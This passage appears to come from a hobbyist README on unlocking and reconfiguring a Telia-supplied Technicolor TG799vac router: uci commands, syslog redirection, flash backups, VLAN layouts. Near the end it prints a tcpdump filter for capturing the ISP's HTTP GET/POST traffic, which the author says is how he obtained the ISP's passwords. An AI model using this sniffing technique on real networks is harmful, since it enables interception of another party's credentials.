     processor     : 1
     BogoMIPS    : 1990.65

     Features    : swp half thumb fastmult edsp tls
     CPU implementer : 0x41
     CPU architecture: 7
     CPU variant    : 0x4
     CPU part    : 0xc09
     CPU revision    : 1

     Hardware    : BCM963138
     Revision    : 0000
     Serial     : 0000000000000000

##### Enable or Disable GUI:

```sh
    uci set web.remote.active='1'
```

##### List all interfaces mac-addr:

```sh
    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
    eth0      X0:X0:X0:X0:X0:X0
    eth1      X0:X0:X0:X0:X0:X0
    eth2      X0:X0:X0:X0:X0:X0
    eth3      X0:X0:X0:X0:X0:X0
    eth4      X0:X0:X0:X0:X0:X0
    eth5      X0:X0:X0:X0:X0:X0
    vlan_eth0 X0:X0:X0:X0:X0:X0
    vlan_eth1 X0:X0:X0:X0:X0:X0
    vlan_eth2 X0:X0:X0:X0:X0:X0
    vlan_eth3 X0:X0:X0:X0:X0:X0
    vlan_eth5 X0:X0:X0:X0:X0:X0
    wl0       X0:X0:X0:X0:X0:X0
    wl0_1     X0:X0:X0:X0:X0:X0
    wl0_2     X0:X0:X0:X0:X0:X0
```

#### Various settings:

```sh
    uci set dlnad.config.friendly_name='tg799vac xtream router'
    uci set dlnad.config.model_name='tg799vac xtream router'
    uci set dlnad.config.manufacturer_url=''
    uci set dlnad.config.model_url=''
    uci set env.var.company_name='technicolor'
    uci set env.var.prod_friendly_name='tg799vac xtream router'
    uci set env.var.variant_friendly_name='tg799tvac xtream router'
    uci set env.var.prod_name='media'
    uci set env.var.prod_description='main router'
    uci set env.var.prod_number='tg799vac xtream router'
    uci set env.var.isp='telia'
    uci set mmdetectslic.non_voice_var.company_name='technicolor'
```

##### Remove trafficmon settings:

```sh
    uci delete system.@trafficmon[0].interface=''
    uci delete system.@trafficmon[0].minute=''
    uci delete system.@trafficmon[1].interface=''
    uci delete system.@trafficmon[1].minute=''
    uci delete system.@trafficmon[2].interface=''
    uci delete system.@trafficmon[2].minute=''
    uci delete system.@trafficmon[3]=trafficmon
    uci delete system.@trafficmon[3].interface=''
    uci delete system.@trafficmon[3].minute=''
    uci delete web.trafficmonitor=rule
    uci delete web.ruleset_main.rules='gateway'
    uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
    uci delete web.trafficmonitor.roles='admin'
```
##### Send syslog to your own server instead of sending * to Telia (it's insane that they want all stuff they filtering as default)

```sh
    uci set ledfw.syslog=syslog
    uci set ledfw.syslog.trace='6'
    uci set mmpbx.syslog=syslog
    uci set mmpbx.syslog.service_config='1'
    uci set mmpbx.syslog.service_actions='1'
    uci set mmpbx.syslog.calls='1'
    uci set mmpbx.syslog.syslog_priority='6'
    uci set mmpbx.syslog.hide_user_identity='0'
    uci set mmpbxbrcmdectdev.syslog=syslog
    uci set mmpbxbrcmdectdev.syslog.phone='1'
    uci set mmpbxbrcmdectdev.syslog.syslog_priority='6'
    uci set mmpbxbrcmdectdev.syslog.syslog_hide_dialled_digits='1'
    uci set mmpbxbrcmfxsdev.syslog=syslog
    uci set mmpbxbrcmfxsdev.syslog.phone='1'
    uci set mmpbxbrcmfxsdev.syslog.syslog_priority='6'
    uci set mmpbxbrcmfxsdev.syslog.syslog_hide_dialled_digits='1'
    uci set mmpbxrvsipnet.syslog=syslog
    uci set mmpbxrvsipnet.syslog.registration='1'
    uci set mmpbxrvsipnet.syslog.call_signalling='1'
    uci set mmpbxrvsipnet.syslog.syslog_priority='6'
    uci set mmpbxrvsipnet.syslog.log_sip_message='1'
    uci set mmpbxrvsipnet.syslog.hide_user_identity='0'
    uci set osgi.config.enable_syslog='1'
    uci set siege.log.enable_syslog='1'
    uci del_list web_back.syslogmodal.roles='telia'
```
#### Grab all filters from log.txt when you export this from diagnostic tab and then insert the lines in /etc/config/system to log everything on your syslog server:

```sh
    cat log.txt  | awk '{print $7}' | sed 's/://g' | uniq -d | sort -r | uniq | sed 's/^/        list log_filter "/g' | sed 's/$/"/g'|sed "s/\"/'/g"
```
##### Settings for syslog

```sh
cat << "EOF" > /etc/config/system

    config system
        option log_port '514'
        option log_filter_ip ''<syslog_server>''
        
        option hostname 'router'
        option zonename 'Europe/Stockholm'
        option timezone 'CET-1CEST,M3.5.0,M10.5.0/3'

        option network_timezone '1'
        option hw_reboot_count '0'
        option sw_reboot_count '0'
        option cronloglevel '5'

        list log_filter 'Everything'
        list log_filter 'warmboot'
        list log_filter 'cwmp'
        list log_filter 'cwmpd'
        list log_filter 'Critical'
        list log_filter 'Zonewatcher'
        list log_filter 'wifiinfo'
        list log_filter 'wifi'
        list log_filter 'mmpbxd'
        list log_filter 'transformer'
        list log_filter 'Zonewatcher'
        list log_filter 'zoneredird'
        list log_filter 'zone_daemon'
        list log_filter 'transformer'
        list log_filter 'syslog'
        list log_filter 'root'
        list log_filter 'premiumd'
        list log_filter 'lua'
        list log_filter 'nginx'
        list log_filter 'kernel'
        list log_filter 'ipks'
        list log_filter 'ipk'
        list log_filter 'root'
        list log_filter 'user'
        list log_filter 'mwan'
        list log_filter 'lan'
        list log_filter 'vlan'
        list log_filter 'opkg'
        list log_filter 'hostmanager'
        list log_filter 'hostapd'
        list log_filter 'fseventd'
        list log_filter 'dropbear'
        list log_filter 'dnsmasq-dhcp'
        list log_filter 'dnsmasq'
        list log_filter 'ddns-scripts'
        list log_filter 'awk'
        list log_filter 'assist.remote'
        list log_filter 'assist'
        list log_filter 'ash'
        list log_filter 'bash'
        list log_filter 'sh'
        list log_filter 'clash'
        list log_filter 'user.notice'
        list log_filter 'auth'
        list log_filter 'pppoe-relay-hotplug'
        list log_filter 'odhcpd'
        list log_filter 'ipsec_starter'
        list log_filter 'ipsec'
        list log_filter 'insmod'
        list log_filter 'modprobe'
        list log_filter 'rmmod'
        list log_filter 'vpn'
        list log_filter 'openvpn'
        list log_filter 'netifd'
        list log_filter 'wansensing'
        list log_filter 'miniupnpd'
        list log_filter 'user.info'
        list log_filter 'guest'
        list log_filter 'wget'
        list log_filter 'curl'
        list log_filter 'ssh'
        list log_filter 'sshd'
        list log_filter 'telnet'
        list log_filter 'http'
        list log_filter 'https'
        list log_filter 'ftp'
        list log_filter 'ftpd'
        list log_filter 'uci'

    config timeserver 'ntp'
        option enable_server '1'
        option program '/sbin/firstusedate'
        list server 'ntp1.rgw.telia.se'
        list server 'ntp2.rgw.telia.se'
        list server '0.se.pool.ntp.org'
        list server '1.se.pool.ntp.org'
        list server '2.se.pool.ntp.org'
        list server '3.se.pool.ntp.org'
        list server 'time.google.com'
        list server 'time1.google.com'
        list server 'time2.google.com'
        list server 'time3.google.com'
        list server 'time4.google.com'

    config config config
         option export_plaintext  '1'
         option export_unsigned   '1'
         option import_plaintext  '1'
         option import_unsigned   '1'
         option usb_filesystem_charset 'utf8'

    config coredump
        option path '/root'
        option url 'https://telia-core.tgwfd.org:5443/'
        option action 'ignore'
        option reboot '0'

    config log 'logread'
        option path 'logread'

    config trafficmon
        option interface 'wan'
        option minute '*/720'

    config trafficmon
        option interface 'mgmt'
        option minute '*/720'

    config trafficmon
        option interface 'voip'
        option minute '*/720'

    config trafficmon
        option interface 'iptv'
        option minute '*/720'
        option sw_reboot_count '0'

    config time 'time'
EOF
```


#### Restart system init after you edited the system file

```sh
    /etc/init.d/system restart
```


#### On your syslog server then put this in /etc/syslog/syslog.conf to recieve all messages from your tg799 xtream router.

#### Here is a screenshot from the listening server with the config below:

![Screenshot](files/syslog.png)

    @version: 3.22
    @include "scl.conf"

    options {
        create_dirs(yes);
        owner(wuseman);
        group(wuseman);
        perm(0644);
        dir_owner(wuseman);
        dir_group(wuseman);
        dir_perm(0755);
    };
 
 
    source s_udp {
        network (
                ip-protocol(6)
                transport("udp")
                port(514)
        );
        network (
                transport("udp")
                port(514)
        );
    };

    destination d_host-specific {
        file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-syslog.log");
    };

    log {
        source(s_udp);
        destination(d_host-specific);
    };


    source src {
    unix-stream("/dev/log" max-connections(256));
    internal();
    };

    source kernsrc { file("/proc/kmsg"); };

    # define destinations
    destination authlog { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-auth.log"); };
    destination syslog { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-syslog"); };
    destination cron { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-cron.log"); };
    destination daemon { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-daemon.log"); };
    destination kern { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-kern.log"); };
    destination lpr { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-lpr.log"); };
    destination user { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-user.log"); };
    destination mail { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-mail.log"); };
    destination mailinfo { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-mail.info"); };
    destination mailwarn { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-mail.warn"); };
    destination mailerr { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-mail.err"); };
    destination newscrit { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-news/news.crit"); };
    destination newserr { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-news/news.err"); };
    destination newsnotice { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-news/news.notice"); };
    destination debug { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-debug"); };
    destination messages { file("/home/wuseman/logs/$HOST/$YEAR-$MONTH-$DAY/${HOST}-messages"); };
    destination console { usertty("root"); };
    destination console_all { file("/dev/tty12"); };
    #destination console_all { file("/dev/console"); };
    filter f_authpriv { facility(auth, authpriv); };
    filter f_syslog { not facility(authpriv, mail); };
    filter f_cron { facility(cron); };
    filter f_daemon { facility(daemon); };
    filter f_kern { facility(kern); };
    filter f_lpr { facility(lpr); };
    filter f_mail { facility(mail); };
    filter f_user { facility(user); };
    filter f_debug { not facility(auth, authpriv, news, mail); };
    filter f_messages { level(info..warn)
        and not facility(auth, authpriv, mail, news); };
    filter f_emergency { level(emerg); };
    filter f_info { level(info); };
    filter f_notice { level(notice); };
    filter f_warn { level(warn); };
    filter f_crit { level(crit); };
    filter f_err { level(err); };
    filter f_failed { message("failed"); };
    filter f_denied { message("denied"); };

    # connect filter and destination
    log { source(src); filter(f_authpriv); destination(authlog); };
    log { source(src); filter(f_syslog); destination(syslog); };
    log { source(src); filter(f_cron); destination(cron); };
    log { source(src); filter(f_daemon); destination(daemon); };
    log { source(kernsrc); filter(f_kern); destination(kern); };
    log { source(src); filter(f_lpr); destination(lpr); };
    log { source(src); filter(f_mail); destination(mail); };
    log { source(src); filter(f_user); destination(user); };
    log { source(src); filter(f_mail); filter(f_info); destination(mailinfo); };
    log { source(src); filter(f_mail); filter(f_warn); destination(mailwarn); };
    log { source(src); filter(f_mail); filter(f_err); destination(mailerr); };
    log { source(src); filter(f_debug); destination(debug); };
    log { source(src); filter(f_messages); destination(messages); };
    log { source(src); filter(f_emergency); destination(console); };

    # default log
    log { source(src); destination(console_all); };


##### Now restart system on your router and you should see * messages:

```sh
     /etc/init.d/system restart
```

##### Enable or Disable Time of Day ACL rules:

```sh
    uci set tod.global.enabled='0'
```

##### For login with debug mode enabled, then please go to (Proably not possible but it is to try):

```sh
    http://192.168.1.1/?debug=1
```

##### Enable or Disable so your router wont restart if there is an segmentation fault in a user space program:

```sh
    uci set system.@coredump[0].reboot='0'
    uci commit system
```

#### Just type below command for print the accesskey:

```sh
    sed -e 's/^\(.\{8\}\).*/\1/' /proc/rip/0124
```

#### You can check the current running dns with
```sh
    cat /etc/resolv.conf
```

##### Enable or Disable Content Sharing (Samba / DNLA):
```sh
    uci set samba.samba.enabled='1'
    uci set dlnad.config.enabled='1'
```

##### To view currently dhcp leases:
```sh
    cat /tmp/dhcp.leases
    1534969000 macaddr lanip machine macaddr
```

#### Disable Time of Day ACL rules
```sh
    uci set tod.global.enabled='0'
```

#### To disable mobile card since there is no button, execute: 

```sh
    uci set mobiled.device_defaults.enabled=0
    uci commit
```

#### List installed packages:

```sh
    opkg list_installed 
```

#### Add a new new modal:

```sh
    uci set web.modalsmodalrule=rule
    uci set web.ruleset_main.rules=modalsmodalsrule
    uci add_list web.l2tpipsecservermodal.target='/modals/modals-name.lp'
    uci set web.l2tpipsecservermodal.roles='roles'
```

#### A minimal alias definition for a bridged interface might be:

```sh
    config interface lan
    option 'ifname' 'eth0'
    option 'type' 'bridge'
    option 'proto' 'static'
    option 'ipaddr' '192.168.1.1'
    option 'netmask' '255.255.255.0'

    config interface lan2
     option 'ifname' 'br-lan'
     option 'proto' 'static'
     option 'ipaddr' '10.0.0.1'
     option 'netmask' '255.255.255.0'
```

#### For for a non-bridge interface

```sh
    config interface lan
    option 'ifname' 'eth0'
    option 'proto' 'static'
    option 'ipaddr' '192.168.1.1'
    option 'netmask' '255.255.255.0'

    config interface lan2
     option 'ifname' 'eth0'
     option 'proto' 'static'
     option 'ipaddr' '10.0.0.1'
     option 'netmask' '255.255.255.0'
```

#### Use your tg799 router as a switch instead as router:

##### Here is my example for using all ports for local network and also wan port(5):

```sh
cat << "EOF" > /etc/config/network
    config 'switch' 'eth0'
        option 'enable' '1'

    config 'switch_vlan' 'eth0_0'
     option 'device' 'eth0'
     option 'vlan' '0'
     option 'ports' '4 5' #wan

    config 'switch_vlan' 'eth0_1'
     option 'device' 'eth0'
     option 'vlan' '1'
     option 'ports' '3 5' #lan 1

    config 'switch_vlan' 'eth0_2'
     option 'device' 'eth0'
     option 'vlan' '2'
     option 'ports' '2 5' #lan2

    config 'switch_vlan' 'eth0_3'
     option 'device' 'eth0'
     option 'vlan' '3'
     option 'ports' '1 5' #lan3

    config 'switch_vlan' 'eth0_4'
     option 'device' 'eth0'
     option 'vlan' '4'
     option 'ports' '0 5' #lan4 
```

#### Create backup of all /dev/mtd[1-7]

 Insert usb: 
 ```sh
     mkdir -p /mnt/usb/<label>/backup_mtd
     
     for number in $(seq 0 7); do 
         dd if=/dev/mtd${number} of=/mnt/usb/<label>/backup_mtd/mtd${number}.img;
     done
```
Result for: 17.2.0405-1441042-20191114170637-ec29699cbbf5c66c53b310489f62a141f46bf628: 

     mtd1.img: Squashfs filesystem, little endian, version 4.0, xz compressed, 29719215 bytes, 3791 inodes, blocksize: 262144 bytes, created: Tue May  2 15:59:58 2017
     mtd2.img: ISO-8859 text, with very long lines (65536), with no line terminators
     mtd3.img: data
     mtd4.img: data
     mtd5.img: data
     mtd6.img: data

Just mount mtd1 and play around:

![Screenshot](https://wuseman.nr1.nu/archive/tg799_telia/various_previews/2.png)

```sh
     squashfuse mtd1.img /mnt/router/justforfun
     

#### Using bridge mode with a dedicated PPPoE ethernet port:

```sh
    uci set network.lan.dns='1.1.1.1'
    uci set network.lan.gateway='192.168.0.254'
    uci set mmpbxrvsipnet.sip_net.interface='lan'
    uci set mmpbxrvsipnet.sip_net.interface6='lan6'



#### IT IS VERY IMPORTANT TO ADD BELOW COMMANDS IN SAME ORDER I LISTED THEM.
##### IF YOU ADD THEM IN WRONG ORDER YOU GET A ERROR MESSAGE: 'uci: Invalid Argument'

# VDNT-O
```sh
    uci add_list web.uidefault.upgradefw_role='admin'
    uci set web.natalghelpermodal=rule
    uci set web.relaymodal=rule
    uci set web.systemmodal=rule
    uci set web.iproutesmodal=rule
    uci set web.mmpbxinoutgoingmapmodal=rule
    uci set web.ltedoctor=rule
    uci set web.ltemodal=rule
    uci set web.lteprofiles=rule
    uci set web.ltesim=rule
    uci set web.ltesms=rule
    uci set web.logconnections=rule
    uci set web.logviewer=rule
    uci set web.logviewer.roles=rule
    uci set tod.global.enabled='1'
    uci set mobiled.globals.enabled='1'
    uci set mobiled.device_defaults.enabled='1'
    uci commit; /etc/init.d/nginx restart
```


# VANT-W
#### Rules

```sh
    uci add_list web.uidefault.upgradefw_role='admin'
    uci set web.natalghelpermodal=rule
    uci set web.relaymodal=rule
    uci set web.systemmodal=rule
    uci set web.iproutesmodal=rule
    uci set web.mmpbxinoutgoingmapmodal=rule
    uci set web.ltedoctor=rule
    uci set web.ltemodal=rule
    uci set web.lteprofiles=rule
    uci set web.ltesim=rule
    uci set web.ltesms=rule
    uci set web.logconnections=rule
    uci set web.logviewer=rule
    uci set web.logviewer.roles=rule
    uci set tod.global.enabled='1'
    uci set mobiled.globals.enabled='1'
    uci set mobiled.device_defaults.enabled='1'
    uci commit; /etc/init.d/nginx restart
```

##### Ruleset

```sh
    uci add_list web.ruleset_main.rules=xdsllowmodal
    uci add_list web.ruleset_main.rules=systemmodal
    uci add_list web.ruleset_main.rules=diagnostics
    uci add_list web.ruleset_main.rules=basicviewaccesscodemodal
    uci add_list web.ruleset_main.rules=basicviewwifiguestmodal
    uci add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
    uci add_list web.ruleset_main.rules=basicviewwifipskmodal
    uci add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
    uci add_list web.ruleset_main.rules=basicviewwifissidmodal
    uci add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
    uci add_list web.ruleset_main.rules=relaymodal
    uci add_list web.ruleset_main.rules=iproutesmodal
    uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
    uci commit; /etc/init.d/nginx restart
```

##### Targets

```sh
    uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
    uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
    uci set web.systemmodal.target='/modals/system-modal.lp'
    uci  set web.relaymodal.target='/modals/relay-modal.lp'
    uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
    uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
    uci set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
    uci set web.ltemodal.target='/modals/lte-modal.lp'
    uci set web.ltedoctor.target='/modals/lte-doctor.lp'
    uci set web.lteprofiles.target='/modals/lte-profiles.lp'
    uci set web.logconnections.target='/modals/log-connections-modal.lp'
    uci set web.logviewer.target='/modals/logviewer-modal.lp'
    uci set web.ltesms.target='/modals/lte-sms.lp'
    uci set web.ltesim.target='/modals/lte-sim.lp'
    uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
    uci commit; /etc/init.d/nginx restart
```

##### Roles

```sh

```


##### Remove telia from all roles:
```sh
    uci delete web_back.uidefault.upgradefw_role='telia'
    uci delete web_back.usr_assist.role='telia'
    uci delete web_back.gateway.roles='telia'
    uci delete web_back.login.roles='telia'
    uci delete web_back.password.roles='telia'
    uci delete web_back.homepage.roles='telia'
    uci delete web_back.gatewaymodal.roles='telia'
    uci delete web_back.broadbandmodal.roles='telia'
    uci delete web_back.internetmodal.roles='telia'
    uci delete web_back.wirelessmodal.roles='telia'
    uci delete web_back.wirelessclientmodal.roles='telia'
    uci delete web_back.wirelessqrcodemodal.roles='telia'
    uci delete web_back.ethernetmodal.roles='telia'
    uci delete web_back.devicemodal.roles='telia'
    uci delete web_back.wanservices.roles='telia'
    uci delete web_back.firewallmodal.roles='telia'
    uci delete web_back.diagnosticsconnectionmodal.roles='telia'
    uci delete web_back.diagnosticsnetworkmodal.roles='telia'
    uci delete web_back.diagnosticspingmodal.roles='telia'
    uci delete web_back.diagnosticsxdslmodal.roles='telia'
    uci delete web_back.diagnosticsigmpproxymodal.roles='telia'
    uci delete web_back.assistancemodal.roles='telia'
    uci delete web_back.usermgrmodal.roles='telia'
    uci delete web_back.syslogmodal.roles='telia'
    uci delete web_back.dmzmodal.roles='telia'
    uci delete web_back.iproutesmodal.roles='telia'
    uci delete web_back.contentsharing.roles='telia'
    uci delete web_back.parentalmodal.roles='telia'
    uci delete web_back.iptv.roles='telia'
    uci delete web_back.home.roles='telia'
    uci delete web_back.accesscode.roles='telia'
    uci delete web_back.wifissid.roles='telia'
    uci delete web_back.wifipsk.roles='telia'
    uci delete web_back.wifiguest.roles='telia'
    uci delete web_back.wifissid5GHz.roles='telia'
    uci delete web_back.wifipsk5GHz.roles='telia'
    uci delete web_back.wifiguest5GHz.roles='telia'
    uci delete web_back.mmpbxglobalmodal.roles='telia'
    uci delete web_back.mmpbxprofilemodal.roles='telia'
    uci delete web_back.mmpbxinoutgoingmodal.roles='telia'
    uci delete web_back.mmpbxservicemodal.roles='telia'
    uci delete web_back.mmpbxdectmodal.roles='telia'
```

#### Once you added above you can browse to system-modal.lp and enable/disable ssh or set router in bootp mode:

![Screenshot](.preview/system_modal.png)

#### .... or enable/disable assistance by your own, just give the credenticals to telia when its needed, feels better? :) 

![Screenshhot](.preview/assistance_modal.png)

#### Are you a sneeky bastard as myself? Cool! This is not far away how I got their passwords at top of this README. Figure out that part yourself.

    tcpdump -i vlan_mgmt -s 0 -A 'tcp dst port <assistance_port> or tcp dst port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354' and host <vlan_mgmt_ip>

What does this mean? 

    Explanation, for example:

    tcp[((tcp[12:1] & 0xf0) >> 2):4] first determines the location of the bytes we are interested in (after the TCP header) and then selects the 4 bytes we wish to match against.

    Here 0x47455420 depicts the ASCII value of  characters  'G' 'E' 'T' ' '

    ┌───────────┬─────────────┐
    │ Character │ ASCII Value │
    ├───────────┼─────────────┤
    │ G         │ 47          │
    ├───────────┼─────────────┤
    │ E         │ 45          │
    ├───────────┼─────────────┤
    │ T         │ 54          │
    ├───────────┼─────────────┤
    │ Space     │ 20          │
    └───────────┴─────────────┘

So... 

It means that you will grab all POST and GET http requests from telias client :) 

#### Mirrors for OpenWRT:

    http://mirrors.tuna.tsinghua.edu.cn/openwrt   HTTP, HTTPS, RSYNC     China
    http://tp.stw-bonn.de/pub/openwrt/            HTTP, FTP              Germany
    http://http://openwrt.emagnus.eu/openwrt/     HTTP, HTTPS, RSYNC     Germany
    http://ba.mirror.garr.it/mirrors/openwrt/     HTTP, FTP, RSYNC       Italy

# CONTACT

    If you have problems, questions, ideas or suggestions please contact
    us by posting to wuseman@nr1.nu

# WEB SITE

    https://wuseman.nr1.nu

    https://nr1.nu 

### END!









